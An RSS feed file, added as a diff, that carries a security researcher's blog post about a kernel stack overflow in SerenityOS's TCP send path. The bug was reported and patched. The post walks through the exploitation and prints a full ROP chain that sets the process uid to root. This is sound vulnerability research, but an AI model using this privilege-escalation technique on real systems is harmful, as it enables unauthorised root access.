@@ -1,0 +1,194 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on ABigPickle</title>
+        <link>https://example.com/posts/</link>
+        <description>Recent content in Posts on ABigPickle</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Fri, 05 Mar 2021 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://example.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>SerenityOS: Kernel Hacking Adventures</title>
+            <link>https://example.com/posts/2021/03/serenityos-kernel-hacking-adventures/</link>
+            <pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://example.com/posts/2021/03/serenityos-kernel-hacking-adventures/</guid>
+            <description>&amp;ldquo;Hello, Friends!&amp;rdquo; Recently I have taken an interest in a project called SerenityOS. Stolen straight from the GitHub:
+ SerenityOS is a love letter to &amp;rsquo;90s user interfaces with a custom Unix-like core. It flatters with sincerity by stealing beautiful ideas from various other systems.
+Roughly speaking, the goal is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by us, for us, based on the things we like.</description>
+            <content type="html"><![CDATA[<p><img src="https://styles.redditmedia.com/t5_11p1s4/styles/communityIcon_82qz1x1k5uj41.png" alt="SerenityOS Logo"></p>
+<h1 id="hello-friends">&ldquo;Hello, Friends!&rdquo;</h1>
+<p>Recently I have taken an interest in a project called SerenityOS. Stolen straight from the <a href="https://github.com/SerenityOS/serenity">GitHub</a>:</p>
+<blockquote>
+<p>SerenityOS is a love letter to &rsquo;90s user interfaces with a custom Unix-like core. It flatters with sincerity by stealing beautiful ideas from various other systems.</p>
+<p>Roughly speaking, the goal is a marriage between the aesthetic of late-1990s productivity software and the power-user accessibility of late-2000s *nix. This is a system by us, for us, based on the things we like.</p>
+</blockquote>
+<p>It&rsquo;s a surprisingly featured hobby operating system with quite a welcoming community behind it. It caught my radar after a series of videos by LiveOverflow and Andreas (the developer) detailing a few exploits made during the <a href="https://hxp.io/blog/79/hxp-CTF-2020-wisdom2/">2020 hxp CTF</a>, so I decided to explore the system myself. Eventually, I found a memory corruption bug in some networking code that could be leveraged into kernel-mode code execution.</p>
+<h1 id="the-bug">The Bug</h1>
+<p>The vulnerability can be hit so easily by some bad code that I&rsquo;m surprised it wasn&rsquo;t found by a fuzzer immediately. At its core, it&rsquo;s a stack overflow in the function <code>TCPSocket::send_tcp_packet</code>. To see how, let&rsquo;s take a look at the implementation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">KResult TCPSocket<span style="color:#f92672">::</span>send_tcp_packet(u16 flags, <span style="color:#66d9ef">const</span> UserOrKernelBuffer<span style="color:#f92672">*</span> payload, size_t payload_size)
+{
+    <span style="color:#66d9ef">const</span> size_t buffer_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TCPPacket) <span style="color:#f92672">+</span> payload_size;
+    <span style="color:#66d9ef">alignas</span>(TCPPacket) u8 buffer[buffer_size];
+    <span style="color:#66d9ef">new</span> (buffer) TCPPacket;
+    <span style="color:#66d9ef">auto</span><span style="color:#f92672">&amp;</span> tcp_packet <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(TCPPacket<span style="color:#f92672">*</span>)(buffer);
+    ASSERT(local_port());
+    tcp_packet.set_source_port(local_port());
+    tcp_packet.set_destination_port(peer_port());
+    tcp_packet.set_window_size(<span style="color:#ae81ff">1024</span>);
+    tcp_packet.set_sequence_number(m_sequence_number);
+    tcp_packet.set_data_offset(<span style="color:#66d9ef">sizeof</span>(TCPPacket) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(u32));
+    tcp_packet.set_flags(flags);
+    <span style="color:#75715e">//...
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (payload <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>payload<span style="color:#f92672">-&gt;</span>read(tcp_packet.payload(), payload_size))
+        <span style="color:#66d9ef">return</span> EFAULT;
+    <span style="color:#75715e">//...
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (tcp_packet.has_syn() <span style="color:#f92672">||</span> payload_size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+        <span style="color:#75715e">//...
+</span><span style="color:#75715e"></span>        send_outgoing_packets();
+        <span style="color:#66d9ef">return</span> KSuccess;
+    }
+    <span style="color:#75715e">//...
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>This function is called when attempting to use the <code>send()</code> syscall on a TCP socket (naturally). None of the parent callers in the chain (<code>Process::sys$sendmsg</code>, <code>IPv4Socket::sendto</code>, and <code>TCPSocket::protocol_send</code>) do any bounds checking on the user-provided <code>payload_size</code> other than ensuring the value is in userspace. Unfortunately, a value being in userspace is quite a lax requirement when then using the value to make a stack allocation. The problem line is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">alignas</span>(TCPPacket) u8 buffer[buffer_size];
+</code></pre></div><p><code>buffer</code> is then a Variable-length Array (<a href="https://en.wikipedia.org/wiki/Variable-length_array">VLA</a>) which is a really cursed feature from C99 that is as bad as it sounds. It attempts to dynamically resize the stack-frame using the value we provided, which can do some very unexpected things when the value is larger than the stack size (Serenity seems to use a stack size of 2^16 in the kernel). We can thus easily obliterate the stack and trigger a crash by calling something to the effect of:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">send(tcp_socket, user_buffer, <span style="color:#ae81ff">0xdeadaa</span>, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">//BOOM!
+</span></code></pre></div><p>This is all well and good, but can we actually do something useful with this? First and foremost, we need to make sure there&rsquo;s no funny business going on with the allocation itself. Examining the code produced by gcc:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="color:#66d9ef">...</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+749</span><span style="color:#f92672">&gt;:</span> test   eax,eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+751</span><span style="color:#f92672">&gt;:</span> jg     <span style="color:#ae81ff">0xc018a36f</span> <span style="color:#f92672">&lt;</span>Kernel<span style="color:#f92672">::</span>TCPSocket<span style="color:#f92672">::</span><span style="color:#a6e22e">send_tcp_packet</span>(unsigned short, Kernel<span style="color:#f92672">::</span>UserOrKernelBuffer const<span style="color:#f92672">*</span>, unsigned long)<span style="color:#ae81ff">+771</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+753</span><span style="color:#f92672">&gt;:</span> push   edx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+754</span><span style="color:#f92672">&gt;:</span> push   edx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+755</span><span style="color:#f92672">&gt;:</span> push   eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+756</span><span style="color:#f92672">&gt;:</span> lea    eax,[ebx<span style="color:#ae81ff">+0</span>x1c3be4]
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+762</span><span style="color:#f92672">&gt;:</span> push   eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+763</span><span style="color:#f92672">&gt;:</span> call   <span style="color:#ae81ff">0xc01e08e2</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">__ubsan_handle_vla_bound_not_positive</span>()<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+768</span><span style="color:#f92672">&gt;:</span> add    esp,<span style="color:#ae81ff">0x10</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+771</span><span style="color:#f92672">&gt;:</span> mov    eax,DWORD PTR [ebp<span style="color:#ae81ff">-0</span>x70]
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+774</span><span style="color:#f92672">&gt;:</span> lea    esi,[ebp<span style="color:#ae81ff">-0</span>x58]
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+777</span><span style="color:#f92672">&gt;:</span> add    eax,<span style="color:#ae81ff">0xf</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+780</span><span style="color:#f92672">&gt;:</span> and    eax,<span style="color:#ae81ff">0xfffffff0</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+783</span><span style="color:#f92672">&gt;:</span> sub    esp,eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+785</span><span style="color:#f92672">&gt;:</span> lea    eax,[ebp<span style="color:#ae81ff">-0</span>x70]
+<span style="color:#66d9ef">...</span>
+</code></pre></div><p>Seems to do exactly as advertised, just a <code>sub esp</code> with our value (and with the shiny UB sanitizer attached). So now that we can be confident the allocation won&rsquo;t mess with any memory, the next step is using it safely. Nearly right after the allocation, we have our userspace buffer being copied into the kernel buffer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (payload <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>payload<span style="color:#f92672">-&gt;</span>read(tcp_packet.payload(), payload_size))
+    <span style="color:#66d9ef">return</span> EFAULT;
+</code></pre></div><p>This could be bad news for us <em>if</em> we provide a valid-sized user buffer because then we&rsquo;d at the very least hit the guard page below the stack and fail. But that&rsquo;s a big <em>if</em>. Providing a non-valid user buffer is totally fair game, too. How would the kernel know? What I mean by this is that our buffer isn&rsquo;t as long as we say it is. The result is that as <code>payload-&gt;read</code> attempts to copy over our bytes, it&rsquo;ll fault when it hits our bad memory. But this time, the fault will be on the <em>user side</em>, meaning the function will gracefully exit on the kernel&rsquo;s end.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">u8<span style="color:#f92672">*</span> stack_smash <span style="color:#f92672">=</span> (u8<span style="color:#f92672">*</span>)mmap(<span style="color:#66d9ef">nullptr</span>, ST_BUFFER_LEN, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE, MAP_SHARED <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+...
+send(socket_fd, stack_smash, send_len, <span style="color:#ae81ff">0</span>); <span style="color:#75715e">//send_len is much, much larger than ST_BUFFER_LEN!
+</span></code></pre></div><p><a href="https://twitter.com/patrickwardle">@patrickwardle</a> has a nice visual of this regarding a similar idea on macOS:</p>
+<p><img src="https://pbs.twimg.com/media/EvYgh2MVIAYT_8I?format=jpg&amp;name=large" alt="macOS partial write"></p>
+<p>This is wonderful, as this chain of events means we have:</p>
+<ul>
+<li>A <code>sub esp</code> with a user-controlled value</li>
+<li>An arbitrary write with another user-controlled value/length</li>
+<li>A graceful exit</li>
+</ul>
+<p>I reported the <a href="https://github.com/SerenityOS/serenity/issues/5310">issue</a> and it was fixed within 15 minutes. This guy is a beast!</p>
+<p>Now we have all the tools necessary to exploit this :)</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>We have essentially what is an arbitrary write primitive, so first we must choose what we want to write to. We have to keep in mind that we are writing from an offset from the stack, though, which might make things a little unpredictable. Thankfully, there is little to no KASLR on the system (as far as I&rsquo;ve seen) but general system noise and randomness make specific writes fairly difficult. That makes directly writing to a critical structure out of the question, but what about staying in the realm of the stack? As the bug is a stack overflow we can&rsquo;t write to anything already on our stack (as it continues to grow downwards), but I did notice the offsets between stacks seems to remain constant:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs">...
+<span style="color:#a6e22e">[#0 SystemServer(5:5)]</span>: Created kernel stack: <span style="color:#ae81ff">0</span>xc35df000
+<span style="color:#a6e22e">[#0 SystemServer(5:5)]</span>: Created kernel stack: <span style="color:#ae81ff">0</span>xc35f0000
+<span style="color:#a6e22e">[#0 SystemServer(5:5)]</span>: Created kernel stack: <span style="color:#ae81ff">0</span>xc3601000
+<span style="color:#a6e22e">[#0 SystemServer(5:5)]</span>: Created kernel stack: <span style="color:#ae81ff">0</span>xc3612000
+...
+</code></pre></div><p>The offset is 0x11000, which is just the stack size 0x10000 plus the guard page size 0x1000. And so, if we can&rsquo;t write to our own stack&hellip; we can still write to another process stack fairly reliably. It then just becomes a case of winning a race condition between what the other process is doing and the write that we do. This is not a problem however as we control the &lsquo;victim&rsquo; process, so we can just make it do something as trivial as call sleep, giving us an arbitrary race window. There is also one final annoyance of some randomization that is done whenever we call a syscall:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">// Apply a random offset in the range 0-255 to the stack pointer,
+</span><span style="color:#75715e">// to make kernel stacks a bit less deterministic.
+</span><span style="color:#75715e">// Since this is very hot code, request random data in chunks instead of
+</span><span style="color:#75715e">// one byte at a time. This is a noticeable speedup.
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (g_random_byte_buffer_offset <span style="color:#f92672">==</span> RandomByteBufferSize) {
+    get_fast_random_bytes(g_random_byte_buffer, RandomByteBufferSize);
+    g_random_byte_buffer_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>This slight randomization to the stack bases makes writing to an exact address of the victim&rsquo;s stack unreliable (granted, it could be brute-forced in a millisecond). But once again the stars align as the sleep syscall does not care very much about how the stack is laid out as it returns. During its call, it eventually reaches the function <code>Processor::switch_context</code>, which is the final stage before swapping contexts. In it, it does:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="color:#66d9ef">...</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+159</span><span style="color:#f92672">&gt;:</span> pushf  
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+160</span><span style="color:#f92672">&gt;:</span> push   ebx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+161</span><span style="color:#f92672">&gt;:</span> push   esi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+162</span><span style="color:#f92672">&gt;:</span> push   edi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+163</span><span style="color:#f92672">&gt;:</span> push   ebp
+<span style="color:#66d9ef">...</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+186</span><span style="color:#f92672">&gt;:</span> push   eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+187</span><span style="color:#f92672">&gt;:</span> push   edx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+188</span><span style="color:#f92672">&gt;:</span> push   ecx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+189</span><span style="color:#f92672">&gt;:</span> cld    
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+190</span><span style="color:#f92672">&gt;:</span> jmp    <span style="color:#ae81ff">0xc011b7d4</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">enter_thread_context</span>()<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+195</span><span style="color:#f92672">&gt;:</span> pop    edx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+196</span><span style="color:#f92672">&gt;:</span> pop    eax
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+197</span><span style="color:#f92672">&gt;:</span> pop    ebp
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+198</span><span style="color:#f92672">&gt;:</span> pop    edi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+199</span><span style="color:#f92672">&gt;:</span> pop    esi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+200</span><span style="color:#f92672">&gt;:</span> pop    ebx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+201</span><span style="color:#f92672">&gt;:</span> popf   
+<span style="color:#66d9ef">...</span>
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+225</span><span style="color:#f92672">&gt;:</span> lea    esp,[ebp<span style="color:#ae81ff">-0</span>xc]
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+228</span><span style="color:#f92672">&gt;:</span> pop    ebx
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+229</span><span style="color:#f92672">&gt;:</span> pop    esi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+230</span><span style="color:#f92672">&gt;:</span> pop    edi
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+231</span><span style="color:#f92672">&gt;:</span> pop    ebp
+<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">+232</span><span style="color:#f92672">&gt;:</span> ret    
+<span style="color:#66d9ef">...</span>
+</code></pre></div><p>Pretty much saving the state and restoring it afterwards. Crucially, it loads <code>esp</code> with a value on the stack, then returns shortly after. Accuracy doesn&rsquo;t matter here, we can just spray the stack with a new stack pointer and have it return from there&hellip; code execution! At this point, we just need to put a ROP chain in some kernel memory and have the stack be redirected to there. I chose to just spray some heap memory with the ROP, but this part was extremely iffy. The offset between the current stack and the heap is not something I could reasonably predict so I had to pretty much blast the entire heap with the code. I used something like a nop sled but with a bunch of rets instead (a ret sled?) to make the ROP chain execution reliable but it would still crash half the time if the offset was too large and I wrote to some bad memory. There&rsquo;s probably a better way to store the ROP but for my purposes, it will suffice.</p>
+<p>The ROP chain I ended up with was very similar to the one in vakzz&rsquo;s awesome <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">exploit chain</a>, writing root to our processes permission bits.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc0157c1e</span>); <span style="color:#75715e">//pop eax; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc0811000</span>); <span style="color:#75715e">//heap
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc011ccdc</span>); <span style="color:#75715e">//pop edx; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc02289ef</span>); <span style="color:#75715e">//Kernell::process::current()
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc019092e</span>); <span style="color:#75715e">//mov dw [eax], edx; ret;
+</span><span style="color:#75715e"></span>
+pad(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x41414141</span>);       <span style="color:#75715e">//stack padding
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc0157cec</span>); <span style="color:#75715e">//pop edi; pop ebp; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc0811018</span>); <span style="color:#75715e">//heap+0x18 
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x00000000</span>); <span style="color:#75715e">//dummy 
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc0195672</span>); <span style="color:#75715e">//call dw [edi - 0x18]; ret;
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc011ccdc</span>); <span style="color:#75715e">//pop edx; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x00000038</span>); <span style="color:#75715e">//uid offset
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc018f828</span>); <span style="color:#75715e">//add eax, edx; ret;
+</span><span style="color:#75715e"></span>
+pad(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x42424242</span>);       <span style="color:#75715e">//stack padding
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc011ccdc</span>); <span style="color:#75715e">//pop edx; ret
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x00000000</span>); <span style="color:#75715e">//root
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc019092e</span>); <span style="color:#75715e">//mov dw [eax], edx; ret
+</span><span style="color:#75715e"></span>
+pad(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0x43434343</span>);       <span style="color:#75715e">//stack padding
+</span><span style="color:#75715e"></span>
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc012476c</span>); <span style="color:#75715e">//cli; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc02611c8</span>); <span style="color:#75715e">//pop ds; cmc; dec ecx; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, ds);
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, <span style="color:#ae81ff">0xc013080f</span>); <span style="color:#75715e">//iretd; ret;
+</span><span style="color:#75715e"></span>write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, (u32)<span style="color:#f92672">&amp;</span>shell);
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, cs);
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, flags);
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, (u32)(user_stack <span style="color:#f92672">+</span> <span style="color:#ae81ff">50</span><span style="color:#f92672">*</span>PAGE_SIZE));
+write_u32(heap_smash, <span style="color:#f92672">&amp;</span>off, ss);
+</code></pre></div><p>The final step was just compiling all this into a working exploit. To summarize,</p>
+<ul>
+<li>There is a stack overflow in <code>TCPSocket::send_tcp_packet</code> that gives an arbitrary write from an offset off the stack</li>
+<li>We can reliably write to a stack below ours, for example a stack owned by a child process</li>
+<li>Calling sleep gives ample time to smash its stack and have it use our own stack pointer and thus return pointer</li>
+<li>ROP our way to victory</li>
+</ul>
+<p>My final-ish exploit code can be found <a href="https://gist.github.com/ABigPickle/77fa81b7d7e5c2b8f9ffb54b5cdc004a">here</a>.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Tinkering around with both the SerenityOS kernel and its JS engine have been a blast and I hope to return to them in the future, especially when the JS engine is more fleshed out. I&rsquo;d also like to thank Andreas for answering my questions about his system very patiently :P Hope you enjoyed this little blurb about making a kernel exploit.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
